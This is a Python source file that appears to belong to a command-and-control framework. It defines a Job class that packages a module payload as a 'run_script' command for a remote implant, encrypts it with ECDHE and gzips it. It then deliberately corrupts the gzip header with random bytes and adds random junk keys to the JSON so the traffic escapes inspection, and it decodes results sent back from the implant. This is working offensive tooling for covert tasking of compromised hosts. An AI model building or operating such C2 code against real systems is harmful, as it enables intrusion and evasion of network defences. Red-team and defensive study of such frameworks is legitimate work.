import gzip
import json
from io import BytesIO
from core.utils import gen_random_string
from core.crypto import ECDHE
from base64 import b64encode, b64decode
from secrets import token_bytes


class InvalidJob(Exception):
    pass


class Job:
    def __init__(self, module):
        self.id = gen_random_string()
        self.ecdhe = ECDHE()
        self.payload = module.payload()
        self.iv = None
        self.public_key = None

    def set_public_key(self, data):
        stage_key_info = json.loads(self.decode(b64decode(data['data'])))
        self.public_key = self.ecdhe.import_public_key(stage_key_info['pubkey'])
        self.iv = b64decode(stage_key_info['iv'])

    def decode(self, data):
        good_gzip = bytearray(data)
        good_gzip[:2] = b"\x1f\x8b"

        stream = BytesIO(bytes(good_gzip))

        with gzip.open(stream, 'rb') as f:
            return f.read()

    def encode(self, job):
        stream = BytesIO()
        with gzip.open(stream, 'wb') as gzip_stream:
            gzip_stream.write(json.dumps(job).encode())

        malform = bytearray(stream.getvalue())
        malform[:2] = token_bytes(2)

        return bytes(malform)

    def encrypt(self, data):
        return self.ecdhe.encrypt(self.public_key, json.dumps(data).encode())

    def decrypt(self, data):
        decrypted = self.ecdhe.decrypt(self.public_key, self.iv, data)
        print(decrypted)

    def get_results(self, data):
        decoded_results = self.decode(b64decode(data['data']))
        return self.decrypt(decoded_results)

    def json(self):
        data = {'id': self.id, 'command': 'run_script', 'job': self.payload}

        job = {
            'pubkey': self.ecdhe.export_public_key(),
            'iv': b64encode(self.ecdhe.IV).decode(),
            'data': b64encode(self.encrypt(data)).decode()
        }

        return {
            gen_random_string(): b64encode(token_bytes(5)).decode(),
            'data': b64encode(self.encode(job)).decode()
        }

    def __eq__(self, other):
        return self.id == other.id
